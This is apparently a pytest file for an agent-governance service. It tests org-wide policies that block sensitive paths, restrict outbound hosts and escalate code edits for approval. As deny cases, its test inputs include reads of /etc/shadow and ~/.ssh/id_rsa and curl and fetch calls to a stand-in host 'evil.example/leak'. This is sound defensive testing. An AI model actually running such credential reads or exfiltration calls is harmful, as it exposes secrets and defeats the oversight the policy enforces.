"""Org policy controls: an admin sets org-wide guardrails every managed agent
inherits — blocked paths + egress allowlist (deny) and approval classes (escalate).
Enforced through the coding hook's /gate/evaluate.
"""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

from eidolon.config import get_settings


@pytest.fixture
def ctx(monkeypatch, tmp_path):
    monkeypatch.setenv("EIDOLON_SAGE_BACKEND", "memory")
    monkeypatch.setenv("EIDOLON_DATABASE_URL", f"sqlite:///{tmp_path/'pol.db'}")
    monkeypatch.setenv("EIDOLON_ADMIN_TOKEN", "admin-t")
    get_settings.cache_clear()
    from eidolon.data import db as db_mod

    db_mod.get_engine.cache_clear()
    db_mod.get_sessionmaker.cache_clear()
    import eidolon.api.app as app_module
    from eidolon.api import accounts as acc

    app_module._runtime = None
    app_module._live_sf = None
    app_module._coding_cache = None
    app_module._login_hits.clear()
    client = TestClient(app_module.app)
    sf = app_module._live_store()
    user = acc.create_user(sf, "admin@x.com", "password12")
    org = acc.ensure_personal_org(sf, user["id"], user["email"])
    client.cookies.set("eidolon_user", acc.open_session(sf, user["id"]))
    agent = acc.create_agent(sf, org, user["id"], "claude-code", "coding/operative")
    yield client, agent["gateway_key"]

    app_module._runtime = None
    app_module._live_sf = None
    app_module._coding_cache = None
    get_settings.cache_clear()
    db_mod.get_engine.cache_clear()
    db_mod.get_sessionmaker.cache_clear()


def _set_policy(client, **policy):
    return client.post("/api/orgs/policy", json={"policy": policy})


def _evaluate(client, key, tool, tool_input):
    return client.post("/gate/evaluate", json={"tool": tool, "tool_input": tool_input},
                       headers={"Authorization": f"Bearer {key}"}).json()


def test_blocked_paths_deny(ctx) -> None:
    client, key = ctx
    assert _set_policy(client, blocked_paths=["/etc", ".ssh"]).status_code == 200
    # a read of a blocked path is denied...
    d = _evaluate(client, key, "Read", {"file_path": "/etc/shadow"})
    assert d["decision"] == "deny"
    assert "org-restricted-path" in d["reason"]
    # ...and an edit under ~/.ssh too
    assert _evaluate(client, key, "Edit", {"file_path": "/home/me/.ssh/id_rsa"})["decision"] == "deny"
    # a normal in-repo read is still allowed
    assert _evaluate(client, key, "Read", {"file_path": "src/app.py"})["decision"] == "allow"


def test_egress_allowlist_deny(ctx) -> None:
    client, key = ctx
    assert _set_policy(client, egress_allowlist=["docs.example.com", "github.com"]).status_code == 200
    # allowlisted host (and a subdomain) pass
    assert _evaluate(client, key, "WebFetch", {"url": "https://docs.example.com/x"})["decision"] == "allow"
    assert _evaluate(client, key, "WebFetch", {"url": "https://api.github.com/repos"})["decision"] == "allow"
    # a non-allowlisted host is denied
    d = _evaluate(client, key, "WebFetch", {"url": "https://evil.example/leak"})
    assert d["decision"] == "deny"
    assert "org-egress-blocked" in d["reason"]
    # a shell command that curls a non-allowlisted host is denied too
    assert _evaluate(client, key, "Bash",
                     {"command": "curl https://evil.example/x"})["decision"] == "deny"


def test_approval_classes_escalate(ctx) -> None:
    client, key = ctx
    # baseline: edits act autonomously
    assert _evaluate(client, key, "Edit",
                     {"file_path": "src/app.py", "old_string": "a", "new_string": "b"})["decision"] == "allow"
    # force approval for edits -> now they escalate (engine rebuilt on set)
    assert _set_policy(client, approval_classes=["edit-code"]).status_code == 200
    d = _evaluate(client, key, "Edit",
                  {"file_path": "src/app.py", "old_string": "a", "new_string": "b"})
    assert d["decision"] == "ask"
    # reads still act
    assert _evaluate(client, key, "Read", {"file_path": "src/app.py"})["decision"] == "allow"


def test_policy_roundtrip_and_auth(ctx) -> None:
    client, _key = ctx
    saved = _set_policy(client, blocked_paths=[" /secret ", "/secret", ""],
                        egress_allowlist=["x.com"], approval_classes=["run-command"]).json()
    assert saved["blocked_paths"] == ["/secret"]  # trimmed + deduped + emptied dropped
    got = client.get("/api/orgs/policy").json()
    assert got == saved
    # unauthenticated cannot read or set
    client.cookies.clear()
    assert client.get("/api/orgs/policy").status_code == 401
    assert client.post("/api/orgs/policy", json={"policy": {}}).status_code == 401
